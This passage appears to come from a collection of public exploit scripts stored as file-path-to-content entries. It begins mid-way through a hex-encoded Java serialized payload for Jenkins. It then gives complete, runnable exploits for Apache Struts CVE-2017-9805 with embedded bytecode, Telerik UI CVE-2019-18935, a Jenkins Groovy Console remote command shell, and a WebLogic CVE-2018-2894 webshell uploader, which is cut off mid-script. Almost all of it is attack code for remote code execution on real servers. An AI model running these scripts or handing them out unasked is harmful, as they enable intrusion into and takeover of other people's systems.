6f\\x74\\x65\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x93\\x74\\x00\\x0e\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x74\\x00\\x08\\x43\\x4c\\x49\\x2e\\x6a\\x61\\x76\\x61\\x71\\x00\\x7e\\x00\\x17\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x00\\x48\\x74\\x00\\x1f\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x74\\x00\\x19\\x43\\x4c\\x49\\x43\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x69\\x6f\\x6e\\x46\\x61\\x63\\x74\\x6f\\x72\\x79\\x2e\\x6a\\x61\\x76\\x61\\x74\\x00\\x07\\x63\\x6f\\x6e\\x6e\\x65\\x63\\x74\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\xdf\\x71\\x00\\x7e\\x00\\x2a\\x71\\x00\\x7e\\x00\\x2b\\x74\\x00\\x05\\x5f\\x6d\\x61\\x69\\x6e\\x73\\x71\\x00\\x7e\\x00\\x13\\x00\\x00\\x01\\x86\\x71\\x00\\x7e\\x00\\x2a\\x71\\x00\\x7e\\x00\\x2b\\x74\\x00\\x04\\x6d\\x61\\x69\\x6e\\x73\\x72\\x00\\x26\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x4c\\x69\\x73\\x74\\xfc\\x0f\\x25\\x31\\xb5\\xec\\x8e\\x10\\x02\\x00\\x01\\x4c\\x00\\x04\\x6c\\x69\\x73\\x74\\x71\\x00\\x7e\\x00\\x0f\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x72\\x00\\x2c\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x73\\x24\\x55\\x6e\\x6d\\x6f\\x64\\x69\\x66\\x69\\x61\\x62\\x6c\\x65\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x19\\x42\\x00\\x80\\xcb\\x5e\\xf7\\x1e\\x02\\x00\\x01\\x4c\\x00\\x01\\x63\\x74\\x00\\x16\\x4c\\x6a\\x61\\x76\\x61\\x2f\\x75\\x74\\x69\\x6c\\x2f\\x43\\x6f\\x6c\\x6c\\x65\\x63\\x74\\x69\\x6f\\x6e\\x3b\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x73\\x72\\x00\\x13\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x41\\x72\\x72\\x61\\x79\\x4c\\x69\\x73\\x74\\x78\\x81\\xd2\\x1d\\x99\\xc7\\x61\\x9d\\x03\\x00\\x01\\x49\\x00\\x04\\x73\\x69\\x7a\\x65\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x00\\x77\\x04\\x00\\x00\\x00\\x00\\x78\\x71\\x00\\x7e\\x00\\x39\\x78\\x71\\x00\\x7e\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x00\\x00\\x00\\x01\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x3b\\x90\\xce\\x58\\x9f\\x10\\x73\\x29\\x6c\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00\\x18\\x68\\x75\\x64\\x73\\x6f\\x6e\\x2e\\x63\\x6c\\x69\\x2e\\x43\\x6c\\x69\\x45\\x6e\\x74\\x72\\x79\\x50\\x6f\\x69\\x6e\\x74\\x71\\x00\\x7e\\x00\\x24\\x75\\x72\\x00\\x13\\x5b\\x4c\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x53\\x74\\x72\\x69\\x6e\\x67\\x3b\\xad\\xd2\\x56\\xe7\\xe9\\x1d\\x7b\\x47\\x02\\x00\\x00\\x77\\x04\\xff\\xff\\xff\\xfd\\x78\\x70\\x00\\x00\\x00\\x01\\x74\\x00\\x10\\x6a\\x61\\x76\\x61\\x2e\\x6c\\x61\\x6e\\x67\\x2e\\x4f\\x62\\x6a\\x65\\x63\\x74\\x74\\x00\\x1d\\x52\\x50\\x43\\x52\\x65\\x71\\x75\\x65\\x73\\x74\\x28\\x31\\x2c\\x77\\x61\\x69\\x74\\x46\\x6f\\x72\\x50\\x72\\x6f\\x70\\x65\\x72\\x74\\x79\\x29'\n\nsock.send(payload)\nprint('[+] Sent payload')\n", "CVE Exploits/Apache Struts 2 CVE-2017-9805.py": "#!/usr/bin/env python3\n# coding=utf-8\n# *****************************************************\n# struts-pwn: Apache Struts CVE-2017-9805 Exploit\n# Author:\n# Mazin Ahmed <Mazin AT MazinAhmed DOT net>\n# This code is based on:\n# https://github.com/rapid7/metasploit-framework/pull/8924\n# https://techblog.mediaservice.net/2017/09/detection-payload-for-the-new-struts-rest-vulnerability-cve-2017-9805/\n# *****************************************************\nfrom __future__ import print_function\nfrom builtins import str\nimport argparse\nimport requests\nimport sys\n\n# Disable SSL warnings\ntry:\n    import requests.packages.urllib3\n    requests.packages.urllib3.disable_warnings()\nexcept Exception:\n    pass\n\nif len(sys.argv) <= 1:\n    print('[*] CVE: 2017-9805 - Apache Struts2 S2-052')\n    print('[*] Struts-PWN - @mazen160')\n    print('\\n%s -h for help.' % (sys.argv[0]))\n    exit(0)\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-u\", \"--url\",\n                    dest=\"url\",\n                    help=\"Check a single URL.\",\n                    action='store')\nparser.add_argument(\"-l\", \"--list\",\n                    dest=\"usedlist\",\n                    help=\"Check a list of URLs.\",\n                    action='store')\nparser.add_argument(\"-c\", \"--cmd\",\n                    dest=\"cmd\",\n                    help=\"Command to execute. (Default: 'echo test > /tmp/struts-pwn')\",\n                    action='store',\n                    default='echo test > /tmp/struts-pwn')\nparser.add_argument(\"--exploit\",\n                    dest=\"do_exploit\",\n                    help=\"Exploit.\",\n                    action='store_true')\nargs = parser.parse_args()\nurl = args.url if args.url else None\nusedlist = args.usedlist if args.usedlist else None\nurl = args.url if args.url else None\ncmd = args.cmd if args.cmd else None\ndo_exploit = args.do_exploit if args.do_exploit else None\n\n\ndef url_prepare(url):\n    url = url.replace('#', '%23')\n    url = url.replace(' ', '%20')\n    if ('://' not in url):\n        url = str('http') + str('://') + str(url)\n    return(url)\n\n\ndef exploit(url, cmd, dont_print_status_on_console=False):\n    url = url_prepare(url)\n    if dont_print_status_on_console is False:\n        print('\\n[*] URL: %s' % (url))\n        print('[*] CMD: %s' % (cmd))\n    cmd = \"\".join([\"<string>{0}</string>\".format(_) for _ in cmd.split(\" \")])\n\n    payload = \"\"\"\n<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n        <dataHandler>\n          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n            <is class=\"javax.crypto.CipherInputStream\">\n              <cipher class=\"javax.crypto.NullCipher\">\n                <initialized>false</initialized>\n                <opmode>0</opmode>\n                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n                  <iter class=\"javax.imageio.spi.FilterIterator\">\n                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n                    <next class=\"java.lang.ProcessBuilder\">\n                      <command>\n                        {0}\n                      </command>\n                      <redirectErrorStream>false</redirectErrorStream>\n                    </next>\n                  </iter>\n                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n                    <method>\n                      <class>java.lang.ProcessBuilder</class>\n                      <name>start</name>\n                      <parameter-types/>\n                    </method>\n                    <name>foo</name>\n                  </filter>\n                  <next class=\"string\">foo</next>\n                </serviceIterator>\n                <lock/>\n              </cipher>\n              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n              <ibuffer/>\n              <done>false</done>\n              <ostart>0</ostart>\n              <ofinish>0</ofinish>\n              <closed>false</closed>\n            </is>\n            <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n</map>\n\"\"\".format(cmd)\n\n    headers = {\n        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2017-9805)',\n        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',\n        'Referer': str(url),\n        'Content-Type': 'application/xml',\n        'Accept': '*/*'\n    }\n\n    timeout = 3\n    try:\n        output = requests.post(url, data=payload, headers=headers, verify=False, timeout=timeout, allow_redirects=False).text\n    except Exception as e:\n        print(\"EXCEPTION::::--> \" + str(e))\n        output = 'ERROR'\n    return(output)\n\n\ndef check(url):\n    url = url_prepare(url)\n    print('\\n[*] URL: %s' % (url))\n\n    initial_request = exploit(url, \"\", dont_print_status_on_console=True)\n    if initial_request == \"ERROR\":\n        result = False\n        print(\"The host does not respond as expected.\")\n        return(result)\n\n    payload_sleep_based_10seconds = \"\"\"\n<map>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n        <dataHandler>\n          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n            <is class=\"javax.crypto.CipherInputStream\">\n              <cipher class=\"javax.crypto.NullCipher\">\n                <initialized>false</initialized>\n                <opmode>0</opmode>\n                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n                  <iter class=\"javax.imageio.spi.FilterIterator\">\n                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n                    <next class=\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" serialization=\"custom\">\n                      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n                        <default>\n                          <__name>Pwnr</__name>\n                          <__bytecodes>\n                            <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu\ndFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA\nEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD\nbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5\nbG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94\nc2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy\naWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs\nYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv\neG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u\ncwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t\nL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu\nL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7\nKVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B\neGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs\nL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu\namF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs\nZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp\nbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv\nYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFs\nL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQAQamF2YS9sYW5nL1RocmVhZAcAKgEA\nBXNsZWVwAQAEKEopVgwALAAtCgArAC4BAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVy\nMTY3MTMxNTc4NjQ1ODk0AQAgTHlzb3NlcmlhbC9Qd25lcjE2NzEzMTU3ODY0NTg5NDsAIQACAAMA\nAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0A\nAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AMgAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0A\nAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AMgAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAa\nAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AMgAA\nAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAiAAMA\nAgAAAA2nAAMBTBEnEIW4AC+xAAAAAQAwAAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJ\n</byte-array>\n                            <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu\ndFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA\nEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2Vy\naWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2\nYQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xh\nbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRp\nbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQAB\nAAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAA\nAAoAAQACABYAEAAJ</byte-array>\n                          </__bytecodes>\n                          <__transletIndex>-1</__transletIndex>\n                          <__indentNumber>0</__indentNumber>\n                        </default>\n                        <boolean>false</boolean>\n                      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\n                    </next>\n                  </iter>\n                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n                    <method>\n                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\n                      <name>newTransformer</name>\n                      <parameter-types/>\n                    </method>\n                    <name>foo</name>\n                  </filter>\n                  <next class=\"string\">foo</next>\n                </serviceIterator>\n                <lock/>\n              </cipher>\n              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n              <ibuffer/>\n              <done>false</done>\n              <ostart>0</ostart>\n              <ofinish>0</ofinish>\n              <closed>false</closed>\n            </is>\n            <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n  <entry>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n  </entry>\n</map>\n\"\"\"\n    headers = {\n        'User-Agent': 'struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2017-9805)',\n        # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',\n        'Referer': str(url),\n        'Content-Type': 'application/xml',\n        'Accept': '*/*'\n    }\n\n    timeout = 8\n    try:\n        requests.post(url, data=payload_sleep_based_10seconds, headers=headers, verify=False, timeout=timeout, allow_redirects=False)\n        # if the response returned before the request timeout.\n        # then, the host should not be vulnerable.\n        # The request should return > 10 seconds, while the timeout is 8.\n        result = False\n    except Exception:\n        result = True\n    return(result)\n\n\ndef main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):\n    if url:\n        if not do_exploit:\n            result = check(url)\n            output = '[*] Status: '\n            if result is True:\n                output += 'Vulnerable!'\n            else:\n                output += 'Not Affected.'\n            print(output)\n        else:\n            exploit(url, cmd)\n            print(\"[$] Request sent.\")\n            print(\"[.] If the host is vulnerable, the command will be executed in the background.\")\n\n    if usedlist:\n        URLs_List = []\n        try:\n            f_file = open(str(usedlist), 'r')\n            URLs_List = f_file.read().replace('\\r', '').split('\\n')\n            try:\n                URLs_List.remove('')\n            except ValueError:\n                pass\n            f_file.close()\n        except Exception as e:\n            print('Error: There was an error in reading list file.')\n            print(\"Exception: \" + str(e))\n            exit(1)\n        for url in URLs_List:\n            if not do_exploit:\n                result = check(url)\n                output = '[*] Status: '\n                if result is True:\n                    output += 'Vulnerable!'\n                else:\n                    output += 'Not Affected.'\n                print(output)\n            else:\n                exploit(url, cmd)\n                print(\"[$] Request sent.\")\n                print(\"[.] If the host is vulnerable, the command will be executed in the background.\")\n\n    print('[%] Done.')\n\nif __name__ == '__main__':\n    try:\n        main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit)\n    except KeyboardInterrupt:\n        print('\\nKeyboardInterrupt Detected.')\n        print('Exiting...')\n        exit(0)\n", "CVE Exploits/Telerik CVE-2019-18935.py": "#!/usr/bin/env python3\n# origin : https://github.com/noperator/CVE-2019-18935\n# INSTALL: \n# git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935\n#  python3 -m venv env\n#  source env/bin/activate\n#  pip3 install -r requirements.txt\n\n# Import encryption routines.\nfrom sys import path\npath.insert(1, 'RAU_crypto')\nfrom RAU_crypto import RAUCipher\n\nfrom argparse import ArgumentParser\nfrom json import dumps, loads\nfrom os.path import basename, splitext\nfrom pprint import pprint\nfrom requests import post\nfrom requests.packages.urllib3 import disable_warnings\nfrom sys import stderr\nfrom time import time\nfrom urllib3.exceptions import InsecureRequestWarning\n\ndisable_warnings(category=InsecureRequestWarning)\n\ndef send_request(files):\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0',\n        'Connection': 'close',\n        'Accept-Language': 'en-US,en;q=0.5',\n        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n        'Upgrade-Insecure-Requests': '1'\n    }\n    response = post(url, files=files, verify=False, headers=headers)\n    try:\n        result = loads(response.text)\n        result['metaData'] = loads(RAUCipher.decrypt(result['metaData']))\n        pprint(result)\n    except:\n        print(response.text)\n\ndef build_raupostdata(object, type):\n    return RAUCipher.encrypt(dumps(object)) + '&' + RAUCipher.encrypt(type)\n\ndef upload():\n\n    # Build rauPostData.\n    object = {\n        'TargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(''), ui_version),\n        'TempTargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(temp_target_folder), ui_version),\n        'MaxFileSize': 0,\n        'TimeToLive': {  # These values seem a bit arbitrary, but when they're all set to 0, the payload disappears shortly after being written to disk.\n            'Ticks': 1440000000000,\n            'Days': 0,\n            'Hours': 40,\n            'Minutes': 0,\n            'Seconds': 0,\n            'Milliseconds': 0,\n            'TotalDays': 1.6666666666666666,\n            'TotalHours': 40,\n            'TotalMinutes': 2400,\n            'TotalSeconds': 144000,\n            'TotalMilliseconds': 144000000\n        },\n        'UseApplicationPoolImpersonation': False\n    }\n    type = 'Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=' + ui_version + ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'\n    raupostdata = build_raupostdata(object, type)\n    \n    with open(filename_local, 'rb') as f:\n        payload = f.read()\n    \n    metadata = {\n        'TotalChunks': 1,\n        'ChunkIndex': 0,\n        'TotalFileSize': 1,\n        'UploadID': filename_remote  # Determines remote filename on disk.\n    }\n    \n    # Build multipart form data.\n    files = {\n        'rauPostData': (None, raupostdata),\n        'file': (filename_remote, payload, 'application/octet-stream'),\n        'fileName': (None, filename_remote),\n        'contentType': (None, 'application/octet-stream'),\n        'lastModifiedDate': (None, '1970-01-01T00:00:00.000Z'),\n        'metadata': (None, dumps(metadata))\n    }\n    \n    # Send request.\n    print('[*] Local payload name: ', filename_local, file=stderr)\n    print('[*] Destination folder: ', temp_target_folder, file=stderr)\n    print('[*] Remote payload name:', filename_remote, file=stderr)\n    print(file=stderr)\n    send_request(files)\n\ndef deserialize():\n\n    # Build rauPostData.\n    object = {\n        'Path': 'file:///' + temp_target_folder.replace('\\\\', '/') + '/' + filename_remote\n    }\n    type = 'System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=' + net_version + ', Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a'\n    raupostdata = build_raupostdata(object, type)\n    \n    # Build multipart form data.\n    files = {\n        'rauPostData': (None, raupostdata),  # Only need this now.\n        '': ''  # One extra input is required for the page to process the request.\n    }\n    \n    # Send request.\n    print('\\n[*] Triggering deserialization for .NET v' + net_version + '...\\n', file=stderr)\n    start = time()\n    send_request(files)\n    end = time()\n    print('\\n[*] Response time:', round(end - start, 2), 'seconds', file=stderr)\n\nif __name__ == '__main__':\n    parser = ArgumentParser(description='Exploit for CVE-2019-18935, a .NET deserialization vulnerability in Telerik UI for ASP.NET AJAX.')\n    parser.add_argument('-t', dest='test_upload', action='store_true', help=\"just test file upload, don't exploit deserialization vuln\")\n    parser.add_argument('-v', dest='ui_version', required=True, help='software version')\n    parser.add_argument('-n', dest='net_version', default='4.0.0.0', help='.NET version')\n    parser.add_argument('-p', dest='payload', required=True, help='mixed mode assembly DLL')\n    parser.add_argument('-f', dest='folder', required=True, help='destination folder on target')\n    parser.add_argument('-u', dest='url', required=True, help='https://<HOST>/Telerik.Web.UI.WebResource.axd?type=rau')\n    args = parser.parse_args()\n\n    temp_target_folder = args.folder.replace('/', '\\\\')\n    ui_version = args.ui_version\n    net_version = args.net_version\n    filename_local = args.payload\n    filename_remote = str(time()) + splitext(basename(filename_local))[1]\n    url = args.url\n\n    upload()\n\n    if not args.test_upload:\n        deserialize()\n\n", "CVE Exploits/Jenkins Groovy Console.py": "#!/usr/bin/env python\n# SRC: https://raw.githubusercontent.com/bl4de/security-tools/master/jgc.py\n# DOC: https://medium.com/@_bl4de/remote-code-execution-with-groovy-console-in-jenkins-bd6ef55c285b\nfrom __future__ import print_function\nfrom builtins import input\nimport requests\nimport sys\n\nprint(\"\"\"\nJenkins Groovy Console cmd runner.\n\nusage: ./jgc.py [HOST]\n\nThen type any command and wait for STDOUT output from remote machine.\nType 'exit' to exit :)\n\"\"\")\nURL = sys.argv[1] + '/scriptText'\nHEADERS = {\n    'User-Agent': 'jgc'\n}\n\nwhile 1:\n    CMD = input(\">> Enter command to execute (or type 'exit' to exit): \")\n    if CMD == 'exit':\n        print(\"exiting...\\n\")\n        exit(0)\n\n    DATA = {\n        'script': 'println \"{}\".execute().text'.format(CMD)\n    }\n    result = requests.post(URL, headers=HEADERS, data=DATA)\n    print(result.text)", "CVE Exploits/WebLogic CVE-2018-2894.py": "#!/usr/bin/env python\n# coding:utf-8\n# Build By LandGrey\n\nfrom __future__ import print_function\nfrom builtins import str\nimport re\nimport sys\nimport time\nimport argparse\nimport requests\nimport traceback\nimport xml.etree.ElementTree as ET\n\n\ndef get_current_work_path(host):\n    geturl = host + \"/ws_utc/resources/setting/options/general\"\n    ua = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'}\n    values = []\n    try:\n        request = requests.get(geturl)\n        if request.status_code == 404:\n            exit(\"[-] {}  don't exists CVE-2018-2894\".format(host))\n        elif \"Deploying Application\".lower() in request.text.lower():\n            print(\"[*] First Deploying Website Please wait a moment ...\")\n            time.sleep(20)\n            request = requests.get(geturl, headers=ua)\n        if \"</defaultValue>\" in request.content:\n            root = ET.fromstring(request.content)\n            value = root.find(\"section\").find(\"options\")\n            for e in value:\n                for sub in e:\n                    if e.tag == \"parameter\" and sub.tag == \"defaultValue\":\n                        values.append(sub.text)\n    except requests.ConnectionError:\n        exit(\"[-] Cannot connect url: {}\".format(geturl))\n    if values:\n        return values[0]\n    else:\n        print(\"[-] Cannot get current work path\\n\")\n        exit(request.content)\n\n\ndef get_new_work_path(host):\n    origin_work_path = get_current_work_path(host)\n    works = \"/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css\"\n    if \"user_projects\" in origin_work_path:\n        if \"\\\\\" in origin_work_path:\n            works = works.replace(\"/\", \"\\\\\")\n            current_work_home = origin_work_path[:origin_work_path.find(\"user_projects\")] + \"user_projects\\\\domains\"\n            dir_len = len(current_work_home.split(\"\\\\\"))\n            domain_name = origin_work_path.split(\"\\\\\")[dir_len]\n            current_work_home += \"\\\\\" + domain_name + works\n        else:\n            current_work_home = origin_work_path[:origin_work_path.find(\"user_projects\")] + \"user_projects/domains\"\n            dir_len = len(current_work_home.split(\"/\"))\n            domain_name = origin_work_path.split(\"/\")[dir_len]\n            current_work_home += \"/\" + domain_name + works\n    else:\n        current_work_home = origin_work_path\n        print(\"[*] cannot handle current work home dir: {}\".format(origin_work_path))\n    return current_work_home\n\n\ndef set_new_upload_path(host, path):\n    data = {\n        \"setting_id\": \"general\",\n        \"BasicConfigOptions.workDir\": path,\n        \"BasicConfigOptions.proxyHost\": \"\",\n        \"BasicConfigOptions.proxyPort\": \"80\"}\n    request = requests.post(host + \"/ws_utc/resources/setting/options\", data=data, headers=headers)\n    if \"successfully\" in request.content:\n        return True\n    else:\n        print(\"[-] Change New Upload Path failed\")\n        exit(request.content)\n\n\ndef upload_webshell(host, uri):\n    set_new_upload_path(host, get_new_work_path(host))\n    files = {\n        \"ks_edit_mode\": \"false\",\n        \"ks_password_front\": password,\n        \"ks_password_changed\": \"true\",\n        \"ks_filename\": (\"360sglab.jsp\", upload_content)\n    }\n\n    request = requests.post(host + uri, files=files)\n    response = request.text\n    match = re.findall(\"<id>(.*?)</id>\", response)\n    if match:\n        tid = match[-1]\n        shell_path = host + \"/ws_utc/css/config/keystore/\" + str(tid) + \"_360sglab.jsp\"\n        if upload_content in requests.get(shell_path, headers=headers).content:\n            print(\"[+] {} exists CVE-2018-2894\".format(host))\n            print(\"[+] Check URL: {} \".format(shell_path))\n        else:\n            print(\"[-] {}  don't exists CVE-2018-2894\".format(host))\n    else:\n        print(\"[-] {}  don't exists CVE-2018-2894\".format(host))\n\n\nif __name__ == \"__main__\":\n    start = time.time()\n    password = \"360sglab\"\n    url = \"/ws_utc/resources/setting/keystore\"\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\"-t\", dest='target', default=\"http://127.0.0.1:7001\", type=str,\n                        help=\"target, such as: http://example.com:7001\")\n\n    upload_content = \"360sglab test\"\n    headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'X-Requested-With': 'XMLHttpRequest', }\n\n    if len(sys.argv) == 1:\n        sys.argv.append('-h')\n    args = parser.parse_args()\n    target = args.target\n\n    target = 